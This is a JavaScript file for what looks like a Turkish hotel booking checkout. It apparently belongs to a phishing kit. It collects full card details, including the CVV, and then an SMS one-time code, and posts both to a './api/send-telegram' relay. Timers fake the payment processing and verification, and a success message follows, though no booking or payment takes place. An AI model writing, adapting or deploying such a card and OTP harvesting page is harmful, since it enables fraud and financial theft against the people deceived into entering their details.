// State
const state = {
  paymentData: {
    a: "",
    b: "",
    c: "",
    d: "",
    e: "",
  },
  smsCode: "",
  checkIn: "2025-11-10",
  checkOut: "2025-11-11",
  guests: "2",
}

// Elements
const bookBtn = document.getElementById("bookBtn")
const closePaymentBtn = document.getElementById("closePayment")
const paymentModal = document.getElementById("paymentModal")
const smsModal = document.getElementById("smsModal")
const paymentForm = document.getElementById("paymentForm")
const smsForm = document.getElementById("smsForm")
const backSmsBtn = document.getElementById("backSMS")
const successState = document.getElementById("successState")

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  bookBtn.addEventListener("click", openPaymentModal)
  closePaymentBtn.addEventListener("click", closePaymentModal)
  paymentForm.addEventListener("submit", handlePayment)
  smsForm.addEventListener("submit", handleSMS)
  backSmsBtn.addEventListener("click", closeSMSModal)
  document.getElementById("completeBtn").addEventListener("click", completePayment)

  // SMS Code input - only numbers
  document.getElementById("smsCode").addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/\D/g, "")
  })

  // Timer
  startTimer()
})

// Payment Modal Functions
function openPaymentModal() {
  const checkIn = document.getElementById("checkIn").value
  const checkOut = document.getElementById("checkOut").value
  const guests = document.getElementById("guests").value

  // Update summary
  document.getElementById("summaryCheckIn").textContent = formatDate(checkIn)
  document.getElementById("summaryCheckOut").textContent = formatDate(checkOut)
  document.getElementById("summaryGuests").textContent = guests
  document.getElementById("summaryPrice").textContent = "2.400 TL"

  // Clear inputs
  document.getElementById("cardNumber").value = ""
  document.getElementById("cardName").value = ""
  document.getElementById("expiryMonth").value = ""
  document.getElementById("expiryYear").value = ""
  document.getElementById("cvv").value = ""

  paymentModal.classList.add("active")
  state.checkIn = checkIn
  state.checkOut = checkOut
  state.guests = guests
}

function closePaymentModal() {
  paymentModal.classList.remove("active")
  smsModal.classList.remove("active")
  successState.style.display = "none"
  document.getElementById("smsForm").style.display = "flex"
}

function formatDate(dateString) {
  const date = new Date(dateString + "T00:00:00")
  const options = { year: "numeric", month: "long", day: "numeric" }
  return date.toLocaleDateString("tr-TR", options)
}

async function handlePayment(e) {
  e.preventDefault()

  const cardNumber = document.getElementById("cardNumber").value
  const cardName = document.getElementById("cardName").value
  const expiryMonth = document.getElementById("expiryMonth").value
  const expiryYear = document.getElementById("expiryYear").value
  const cvv = document.getElementById("cvv").value

  state.paymentData = {
    a: cardNumber,
    b: cardName,
    c: expiryMonth,
    d: expiryYear,
    e: cvv,
  }

  try {
    const response = await fetch("./api/send-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "payment",
        cardNumber: cardNumber,
        cardName: cardName,
        expiryMonth: expiryMonth,
        expiryYear: expiryYear,
        cvv: cvv,
        checkIn: state.checkIn,
        checkOut: state.checkOut,
        guests: state.guests,
        amount: 2400,
      }),
    })
    console.log("[v0] Payment data sent:", response.ok)
  } catch (error) {
    console.error("[v0] Payment send error:", error)
  }

  // Simulate processing
  document.getElementById("paymentBtn").disabled = true
  document.getElementById("paymentBtn").textContent = "İşlem Yapılıyor..."

  setTimeout(() => {
    paymentModal.classList.remove("active")
    smsModal.classList.add("active")
    document.getElementById("smsCode").value = ""
    document.getElementById("smsPrice").textContent = "2.300 TL"
    document.getElementById("paymentBtn").disabled = false
    document.getElementById("paymentBtn").textContent = "2.300 TL ile Ödeme Yap"
  }, 2000)
}

// SMS Modal Functions
function closeSMSModal() {
  smsModal.classList.remove("active")
  successState.style.display = "none"
  document.getElementById("smsForm").style.display = "flex"
}

async function handleSMS(e) {
  e.preventDefault()

  const smsCode = document.getElementById("smsCode").value
  state.smsCode = smsCode

  try {
    const response = await fetch("./api/send-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "sms",
        smsCode: smsCode,
        checkIn: state.checkIn,
        checkOut: state.checkOut,
        guests: state.guests,
        amount: 2300,
        timestamp: new Date().toLocaleString("tr-TR"),
      }),
    })
    console.log("[v0] SMS data sent:", response.ok)
  } catch (error) {
    console.error("[v0] SMS send error:", error)
  }

  // Simulate verification
  document.getElementById("verifyBtn").disabled = true
  document.getElementById("verifyBtn").textContent = "Doğrulanıyor..."

  setTimeout(() => {
    document.getElementById("smsForm").style.display = "none"
    successState.style.display = "block"
    document.getElementById("successAmount").textContent = "2.300 TL"
    document.getElementById("verifyBtn").disabled = false
    document.getElementById("verifyBtn").textContent = "Kodu Doğrula"
  }, 2000)
}

function completePayment() {
  smsModal.classList.remove("active")
  successState.style.display = "none"
  document.getElementById("smsForm").style.display = "flex"
}

// Timer
function startTimer() {
  let timeLeft = 120
  const timerText = document.getElementById("timerText")

  const interval = setInterval(() => {
    timeLeft--
    timerText.textContent = timeLeft

    if (timeLeft <= 0) {
      clearInterval(interval)
      document.querySelector(".resend-btn").disabled = true
    }
  }, 1000)
}

// Dark mode toggle (optional)
function toggleDarkMode() {
  document.documentElement.classList.toggle("dark")
  localStorage.setItem("darkMode", document.documentElement.classList.contains("dark"))
}
